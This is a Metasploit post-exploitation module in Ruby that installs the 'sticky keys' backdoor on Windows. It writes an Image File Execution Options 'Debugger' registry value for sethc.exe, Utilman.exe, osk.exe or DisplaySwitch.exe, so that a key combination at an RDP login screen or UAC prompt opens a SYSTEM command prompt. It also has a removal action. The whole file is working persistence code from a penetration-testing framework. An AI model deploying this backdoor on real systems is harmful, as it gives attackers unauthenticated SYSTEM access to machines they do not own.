##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv

  DEBUG_REG_PATH = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options'
  DEBUG_REG_VALUE = 'Debugger'

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Sticky Keys Persistance Module',
      'Description'   => %q{
        This module makes it possible to apply the 'sticky keys' hack to a session with appropriate
        rights. The hack provides a means to get a SYSTEM shell using UI-level interaction at an RDP
        login screen or via a UAC confirmation dialog. The module modifies the Debug registry setting
        for certain executables.

        The module options allow for this hack to be applied to:

        SETHC   (sethc.exe is invoked when SHIFT is pressed 5 times),
        UTILMAN (Utilman.exe is invoked by pressing WINDOWS+U),
        OSK     (osk.exe is invoked by pressing WINDOWS+U, then launching the on-screen keyboard), and
        DISP    (DisplaySwitch.exe is invoked by pressing WINDOWS+P).

        The hack can be added using the ADD action, and removed with the REMOVE action.

        Custom payloads and binaries can be run as part of this exploit, but must be manually uploaded
        to the target prior to running the module. By default, a SYSTEM command prompt is installed
        using the registry method if this module is run without modifying any parameters.
      },
      'Author'        => ['OJ Reeves'],
      'Platform'      => ['win'],
      'SessionTypes'  => ['meterpreter', 'shell'],
      'Actions'       => [
        ['ADD',    {'Description' => 'Add the backdoor to the target.'}],
        ['REMOVE', {'Description' => 'Remove the backdoor from the target.'}]
      ],
      'References' => [
        ['URL', 'https://social.technet.microsoft.com/Forums/windows/en-US/a3968ec9-5824-4bc2-82a2-a37ea88c273a/sticky-keys-exploit'],
        ['URL', 'http://carnal0wnage.attackresearch.com/2012/04/privilege-escalation-via-sticky-keys.html']
      ],
      'DefaultAction' => 'ADD'
    ))

    register_options([
      OptEnum.new('TARGET', [true, 'The target binary to add the exploit to.', 'SETHC', ['SETHC', 'UTILMAN', 'OSK', 'DISP']]),
      OptString.new('EXE', [true, 'Executable to execute when the exploit is triggered.', '%SYSTEMROOT%\system32\cmd.exe'])
    ])
  end

  #
  # Returns the name of the executable to modify the debugger settings of.
  #
  def get_target_exe_name
    case datastore['TARGET']
    when 'UTILMAN'
     'Utilman.exe'
    when 'OSK'
     'osk.exe'
    when 'DISP'
      'DisplaySwitch.exe'
    else
     'sethc.exe'
    end
  end

  #
  # Returns the the key combinations required to invoke the exploit once installed.
  #
  def get_target_key_combo
    case datastore['TARGET']
    when 'UTILMAN'
      'WINDOWS+U'
    when 'OSK'
      'WINDOWS+U, then launching the on-screen keyboard'
    when 'DISP'
      'WINDOWS+P'
    else
      'SHIFT 5 times'
    end
  end

  #
  # Returns the full path to the target's registry key based on the current target
  # settings.
  #
  def get_target_exe_reg_key
    "#{DEBUG_REG_PATH}\\#{get_target_exe_name}"
  end

  #
  # Runs the exploit.
  #
  def run
    unless is_admin?
      fail_with(Failure::NoAccess, 'The current session does not have administrative rights.')
    end

    print_good("Session has administrative rights, proceeding.")

    target_key = get_target_exe_reg_key

    if action.name == 'ADD'
      command = expand_path(datastore['EXE'])

      registry_createkey(target_key)
      registry_setvaldata(target_key, DEBUG_REG_VALUE, command, 'REG_SZ')

      print_good("'Sticky keys' successfully added. Launch the exploit at an RDP or UAC prompt by pressing #{get_target_key_combo}.")
    else
      registry_deletekey(target_key)
      print_good("'Sticky keys' removed from registry key #{target_key}.")
    end
  end
end
